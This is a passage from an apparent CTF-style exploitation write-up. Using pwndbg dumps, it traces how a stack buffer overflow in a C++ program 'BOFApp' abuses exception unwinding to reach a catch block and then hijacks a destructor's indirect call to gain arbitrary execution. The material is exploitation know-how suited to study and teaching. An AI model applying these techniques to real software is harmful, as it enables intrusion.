</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4018f7</span> <span style="color:#f92672">&lt;</span>ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check()<span style="color:#f92672">+</span><span style="color:#ae81ff">45</span><span style="color:#f92672">&gt;</span>    je     ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check()<span style="color:#f92672">+</span><span style="color:#ae81ff">62</span>                      <span style="color:#f92672">&lt;</span>ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check()<span style="color:#f92672">+</span><span style="color:#ae81ff">62</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4018f9</span> <span style="color:#f92672">&lt;</span>ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check()<span style="color:#f92672">+</span><span style="color:#ae81ff">47</span><span style="color:#f92672">&gt;</span>    lea    rax, [rip <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x7be</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x401900</span> <span style="color:#f92672">&lt;</span>ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check()<span style="color:#f92672">+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>    mov    rdi, rax
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0x401903</span> <span style="color:#f92672">&lt;</span>ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check()<span style="color:#f92672">+</span><span style="color:#ae81ff">57</span><span style="color:#f92672">&gt;</span>    call   raise(<span style="color:#66d9ef">char</span> <span style="color:#66d9ef">const</span><span style="color:#f92672">*</span>)                      <span style="color:#f92672">&lt;</span>raise(<span style="color:#66d9ef">char</span> <span style="color:#66d9ef">const</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        rdi: <span style="color:#ae81ff">0x4020be</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">***</span> stack smash detected <span style="color:#f92672">***</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>        rsi: <span style="color:#ae81ff">0xa</span>
</span></span><span style="display:flex;"><span>        rdx: <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        rcx: <span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x401908</span> <span style="color:#f92672">&lt;</span>ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check()<span style="color:#f92672">+</span><span style="color:#ae81ff">62</span><span style="color:#f92672">&gt;</span>    nop    
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x401909</span> <span style="color:#f92672">&lt;</span>ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check()<span style="color:#f92672">+</span><span style="color:#ae81ff">63</span><span style="color:#f92672">&gt;</span>    mov    rbx, qword ptr [rbp <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40190d</span> <span style="color:#f92672">&lt;</span>ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check()<span style="color:#f92672">+</span><span style="color:#ae81ff">67</span><span style="color:#f92672">&gt;</span>    leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40190e</span> <span style="color:#f92672">&lt;</span>ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check()<span style="color:#f92672">+</span><span style="color:#ae81ff">68</span><span style="color:#f92672">&gt;</span>    ret    
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40190f</span>                                        nop    
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">────────────────────────────────────────────────────────────────────────────────────────</span>[ STACK ]<span style="color:#960050;background-color:#1e0010">────────────────────────────────────────────────────────────────────────────────────────</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0000</span><span style="color:#960050;background-color:#1e0010">│</span> rsp <span style="color:#ae81ff">0x7ffdf367cad0</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">9</span> <span style="color:#75715e">/* &#39;\t&#39; */</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7ffdf367cad8</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffdf367cb40</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0010</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7ffdf367cae0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffdf367cb40</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span><span style="color:#f92672">:</span><span style="color:#ae81ff">001</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7ffdf367cae8</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffdf367cce8</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffdf367e21e</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x74756f2e612f2e</span> <span style="color:#75715e">/* &#39;./a.out&#39; */</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0020</span><span style="color:#960050;background-color:#1e0010">│</span> rbp <span style="color:#ae81ff">0x7ffdf367caf0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffdf367cb10</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffdf367cba0</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">05</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7ffdf367caf8</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x401739</span> (<span style="color:#66d9ef">void</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>mut<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">::</span>launch()<span style="color:#f92672">::</span>{lambda(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>}<span style="color:#f92672">&gt;</span>(BOFApp<span style="color:#f92672">::</span>launch()<span style="color:#f92672">::</span>{lambda(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>} <span style="color:#66d9ef">const</span><span style="color:#f92672">&amp;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">51</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> nop 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0030</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7ffdf367cb00</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffdf367cb3f</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x4141414141414100</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">07</span><span style="color:#f92672">:</span><span style="color:#ae81ff">003</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7ffdf367cb08</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffdf367cb40</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────</span>[ BACKTRACE ]<span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────</span>
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">0x401903</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check()<span style="color:#f92672">+</span><span style="color:#ae81ff">57</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">0x401739</span> <span style="color:#66d9ef">void</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>mut<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">::</span>launch()<span style="color:#f92672">::</span>{lambda(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>}<span style="color:#f92672">&gt;</span>(BOFApp<span style="color:#f92672">::</span>launch()<span style="color:#f92672">::</span>{lambda(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>} <span style="color:#66d9ef">const</span><span style="color:#f92672">&amp;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">51</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>         <span style="color:#ae81ff">0x40169d</span> BOFApp<span style="color:#f92672">::</span>launch()<span style="color:#f92672">+</span><span style="color:#ae81ff">77</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>         <span style="color:#ae81ff">0x403407</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>         <span style="color:#ae81ff">0x4f4ab0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span>         <span style="color:#ae81ff">0x4f4ab0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span>          <span style="color:#ae81ff">0x12000</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span>   <span style="color:#ae81ff">0x7ffdf367cce8</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span>   
</span></span></code></pre></div><p>If it is not found in this function, it will be searched up along the function call chain, and there will be two results:</p>
<ul>
<li>Find the catch, record the catch location, clean the stack starting from the function that throws the exception, until you reach the function where the catch is located, and enter the catch code for processing</li>
<li>If the corresponding catch is not found after walking through the call chain, then call <code>std::terminate()</code>, this function to abort the program by default.</li>
</ul>
<p>If you are curious about that, please feel free to read the <a href="https://baiy.cn/doc/cpp/inside_exception.htm">article</a>.</p>
<p>The next functions called in sequence are: <code>raise-&gt;__cxa_throw-&gt;_Unwind_RaiseException</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0x404056</span> <span style="color:#f92672">&lt;</span>__cxa_throw<span style="color:#f92672">+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>    call   _Unwind_RaiseException                      <span style="color:#f92672">&lt;</span>_Unwind_RaiseException<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        rdi: <span style="color:#ae81ff">0x12c13b0</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x474e5543432b2b00</span>
</span></span><span style="display:flex;"><span>        rsi: <span style="color:#ae81ff">0x4e76f0</span> (typeinfo <span style="color:#66d9ef">for</span> std<span style="color:#f92672">::</span>runtime_error) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x4e75e0</span> (vtable <span style="color:#66d9ef">for</span> __cxxabiv1<span style="color:#f92672">::</span>__si_class_type_info<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x404120</span> (__cxxabiv1<span style="color:#f92672">::</span>__si_class_type_info<span style="color:#f92672">::~</span>__si_class_type_info()) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span>        rdx: <span style="color:#ae81ff">0x404740</span> (std<span style="color:#f92672">::</span>runtime_error<span style="color:#f92672">::~</span>runtime_error()) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span>        rcx: <span style="color:#ae81ff">0x12c1408</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">***</span> stack smash detected <span style="color:#f92672">***</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span></code></pre></div><p>The function <code>_Unwind_RaiseException()</code> takes the address of each frame below to locate the corresponding catch. If it fails to find one, the function calls <code>std::terminate()</code> to abort and exit the program.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────</span>[ BACKTRACE ]<span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────</span>
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">0x404056</span> __cxa_throw<span style="color:#f92672">+</span><span style="color:#ae81ff">54</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>         <span style="color:#ae81ff">0x402178</span> raise(<span style="color:#66d9ef">char</span> <span style="color:#66d9ef">const</span><span style="color:#f92672">*</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">83</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>         <span style="color:#ae81ff">0x4026b2</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check()<span style="color:#f92672">+</span><span style="color:#ae81ff">62</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>         <span style="color:#ae81ff">0x4024e3</span> <span style="color:#66d9ef">void</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>mut<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">::</span>launch()<span style="color:#f92672">::</span>{lambda(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>}<span style="color:#f92672">&gt;</span>(BOFApp<span style="color:#f92672">::</span>launch()<span style="color:#f92672">::</span>{lambda(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>} <span style="color:#66d9ef">const</span><span style="color:#f92672">&amp;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">51</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>         <span style="color:#ae81ff">0x40245a</span> BOFApp<span style="color:#f92672">::</span>launch()<span style="color:#f92672">+</span><span style="color:#ae81ff">62</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span>       <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span>       <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span>       <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
</span></span></code></pre></div><p>So, if we want to continue the flow execution in main, we much provide exactly where the address of the catch block is, so we can continue to exploit it that don&rsquo;t terminate program.</p>
<p>I have found out the address <code>0x4022de</code> that make the program continue execution because it is where the catch block lie.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>  <span style="color:#ae81ff">0x41acdd</span> <span style="color:#f92672">&lt;</span>_Unwind_RaiseException<span style="color:#f92672">+</span><span style="color:#ae81ff">909</span><span style="color:#f92672">&gt;</span>    mov    r14, qword ptr [rbp <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x41ace1</span> <span style="color:#f92672">&lt;</span>_Unwind_RaiseException<span style="color:#f92672">+</span><span style="color:#ae81ff">913</span><span style="color:#f92672">&gt;</span>    mov    r15, qword ptr [rbp <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x41ace5</span> <span style="color:#f92672">&lt;</span>_Unwind_RaiseException<span style="color:#f92672">+</span><span style="color:#ae81ff">917</span><span style="color:#f92672">&gt;</span>    mov    rbp, qword ptr [rbp]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x41ace9</span> <span style="color:#f92672">&lt;</span>_Unwind_RaiseException<span style="color:#f92672">+</span><span style="color:#ae81ff">921</span><span style="color:#f92672">&gt;</span>    mov    rsp, rcx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x41acec</span> <span style="color:#f92672">&lt;</span>_Unwind_RaiseException<span style="color:#f92672">+</span><span style="color:#ae81ff">924</span><span style="color:#f92672">&gt;</span>    pop    rcx
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0x41aced</span> <span style="color:#f92672">&lt;</span>_Unwind_RaiseException<span style="color:#f92672">+</span><span style="color:#ae81ff">925</span><span style="color:#f92672">&gt;</span>    jmp    rcx                           <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">116</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">↓</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4022f1</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">116</span><span style="color:#f92672">&gt;</span>                      endbr64 
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4022f5</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">120</span><span style="color:#f92672">&gt;</span>                      mov    rbx, rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4022f8</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">123</span><span style="color:#f92672">&gt;</span>                      lea    rax, [rbp <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x18</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4022fc</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">127</span><span style="color:#f92672">&gt;</span>                      mov    rdi, rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4022ff</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">130</span><span style="color:#f92672">&gt;</span>                      call   std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>BOFApp, std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;::~</span>unique_ptr()                      <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>BOFApp, std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;::~</span>unique_ptr()<span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>We successfully changed its flow!  it will call to <code>exit()</code> to terminate the program without return.  How can we execute the <code>backdoor()</code> function?</p>
<p>Afterwards, the program will proceed to execute the destructor method of this particular object. Let&rsquo;s delve deeper into this process:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ae81ff">0x4022f1</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">116</span><span style="color:#f92672">&gt;</span>                      endbr64 
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4022f5</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">120</span><span style="color:#f92672">&gt;</span>                      mov    rbx, rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4022f8</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">123</span><span style="color:#f92672">&gt;</span>                      lea    rax, [rbp <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x18</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4022fc</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">127</span><span style="color:#f92672">&gt;</span>                      mov    rdi, rax
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0x4022ff</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">130</span><span style="color:#f92672">&gt;</span>                      call   std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>BOFApp, std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;::~</span>unique_ptr()                      <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>BOFApp, std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;::~</span>unique_ptr()<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        rdi: <span style="color:#ae81ff">0x7ffe1006ece8</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffe1006ed40</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>        rsi: <span style="color:#ae81ff">0x4022f1</span> (main<span style="color:#f92672">+</span><span style="color:#ae81ff">116</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span>        rdx: <span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>        rcx: <span style="color:#ae81ff">0x4022f1</span> (main<span style="color:#f92672">+</span><span style="color:#ae81ff">116</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64     
</span></span></code></pre></div><p>We go through and see this will cause SIGSEV when <code>rdx</code> doesn&rsquo;t point to a valid address,</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4027d7</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(BOFApp<span style="color:#f92672">*</span>) <span style="color:#66d9ef">const</span><span style="color:#f92672">+</span><span style="color:#ae81ff">29</span><span style="color:#f92672">&gt;</span>    mov    rdx, qword ptr [rax]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4027da</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(BOFApp<span style="color:#f92672">*</span>) <span style="color:#66d9ef">const</span><span style="color:#f92672">+</span><span style="color:#ae81ff">32</span><span style="color:#f92672">&gt;</span>    add    rdx, <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0x4027de</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(BOFApp<span style="color:#f92672">*</span>) <span style="color:#66d9ef">const</span><span style="color:#f92672">+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;</span>    mov    rdx, qword ptr [rdx]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4027e1</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(BOFApp<span style="color:#f92672">*</span>) <span style="color:#66d9ef">const</span><span style="color:#f92672">+</span><span style="color:#ae81ff">39</span><span style="color:#f92672">&gt;</span>    mov    rdi, rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4027e4</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(BOFApp<span style="color:#f92672">*</span>) <span style="color:#66d9ef">const</span><span style="color:#f92672">+</span><span style="color:#ae81ff">42</span><span style="color:#f92672">&gt;</span>    call   rdx
</span></span></code></pre></div><p>As long as you control the rax register, you can control the rdx register, which results in arbitrary execution.</p>
<p>This function takes out the data from the stack combined with the stack overflow above we can control the rax register.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span> <span style="color:#ae81ff">0x4025c9</span> <span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>BOFApp, std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;::~</span>unique_ptr()<span style="color:#f92672">+</span><span style="color:#ae81ff">57</span><span style="color:#f92672">&gt;</span>    mov    rbx, rax
